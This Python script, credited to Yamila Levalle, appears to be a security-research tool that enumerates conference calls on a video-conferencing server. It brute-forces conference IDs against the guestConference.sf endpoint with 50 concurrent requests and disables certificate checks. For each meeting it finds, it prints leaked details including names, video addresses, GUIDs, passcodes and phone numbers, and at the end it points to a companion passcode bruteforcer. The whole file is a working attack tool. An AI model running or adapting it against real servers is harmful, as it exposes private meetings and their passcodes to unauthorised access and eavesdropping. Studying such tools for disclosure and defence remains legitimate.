#!/usr/bin/env python3

"""
------------------------------------------------------------------------------
	M33TFINDER - Septiembre 2018 - Yamila Levalle @ylevalle
------------------------------------------------------------------------------
"""

#%%%%%%%%%%% Libraries %%%%%%%%%%%#

import json
import requests
import sys
import aiohttp
import asyncio
import time
import concurrent.futures
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#%%%%%%% Context Variables %%%%%%%#

version = 1.0

#%%%%%%%%%%% Functions %%%%%%%%%%%#

def banner():
	b = """
  __  __ _______________ _____ ___ _   _ ____  _____ ____  
 |  \/  |___ /___ /_   _|  ___|_ _| \ | |  _ \| ____|  _ \ 
 | |\/| | |_ \ |_ \ | | | |_   | ||  \| | | | |  _| | |_) |
 | |  | |___) |__) || | |  _|  | || |\  | |_| | |___|  _ < 
 |_|  |_|____/____/ |_| |_|   |___|_| \_|____/|_____|_| \_\ 

usage: meetfinder.py <targeturl>

example: meetfinder.py https://meet.example.com
                                                         
"""
	print(b)

def parse_args():
	argnumber = len(sys.argv)
	arg = sys.argv[1]
	return arg

#%%%%%%%%%% Detect Valid Range %%%%%%%%%#
	
async def do_req(url,semaphore,a):	
	async with semaphore:
		async with aiohttp.ClientSession() as session:
		
			try:
				async with session.post(url, json={'id':str(a),'passcode':""},verify_ssl=False) as query:
					data = await query.json()
				
					if (data['response'] == "success" or data['reason'] == "invalidConferenceIdOrPasscode"):
						print("[*] ======================================================= [*]")
						print("[!] Conference ID Range Start Detected: " + str(a))
						main.idlist.append(a)
		
			except Exception as e:
				print(e)
				pass
			
#%%%%%%%%%% Detect Valid Conference ID %%%%%%%%%#
								
async def do_req2(url,semaphore,id_call):	
	async with semaphore:
		async with aiohttp.ClientSession() as session:
			
			try:
				async with session.post(url, json={'id':str(id_call),'passcode':""},verify_ssl=False) as query:
					data = await query.json()
				
					if data['response'] == "success":
						print("[*] ======================================================= [*]")
						print("[!] Conference Call Detected!")
						print("[*] ID: "+str(data['conferenceId']))
						print("[*] Name: "+str(data['name']))
						print("[*] Video Address: "+str(data['videoAddress']))
						print("[*] Conference GUID: "+str(data['conferenceGuid']))
						print("[*] Source GUID: "+str(data['sourceGuid']))
						print("[*] Resolution GUID: "+str(data['resolutionGuid']))
						print("[*] Passcode: "+str(data['passcode']))
						print("[*] Phone Number: "+str(data['phoneNumber']))
						print("[*] Weblink: "+str(data['weblink']))
						print("[*] ======================================================= [*]")
						main.counter +=1
							
						if data['passcode']:
							main.protected.append(str(id_call))

			except Exception as e:
				print(e)
				pass

def main():
	banner()
	urlparam = parse_args()
	url = str(urlparam) + "/guestConference.sf"

#%%%%%%%%%% Inicialize Variables %%%%%%%%%#
	
	ranges = []
	futures = []
	futures2 = []
	semaphore = asyncio.BoundedSemaphore(50)
	main.idlist = []
	main.counter = 0	
	main.protected = []

#%%%%%%%%%% Possible Conference Ranges %%%%%%%%%#
	
	ranges.append("6000000")
	
	for i in range (0000, 100000, 1000):
		ranges.append(str(i))
	
#%%%%%%%%%% Asyncio Loop %%%%%%%%%#
		
	loop = asyncio.get_event_loop()	

	for a in ranges:
		futures.append(do_req(url,semaphore,a))
	
	loop.run_until_complete(asyncio.wait(futures))
					
	for item in main.idlist:
		itemrange = int(item)		
		for id_call in range(itemrange,itemrange+100): 
			futures2.append(do_req2(url,semaphore,id_call))
	
	loop.run_until_complete(asyncio.wait(futures2))
	
	loop.close()
	
	print("[*] ======================================================= [*]")
	print("[!] Total Conference Calls Detected: "+ str(main.counter))
	print("[!] Total Conference Calls protected with Passcode: "+ str(len(main.protected)))
	print("[!] If you want to bruteforce a Conference Passcode use meetbreak.py <url> <conferenceid>")
	print("[*] ======================================================= [*]")

main()

#%%%%%%%%%% The End %%%%%%%%%%#
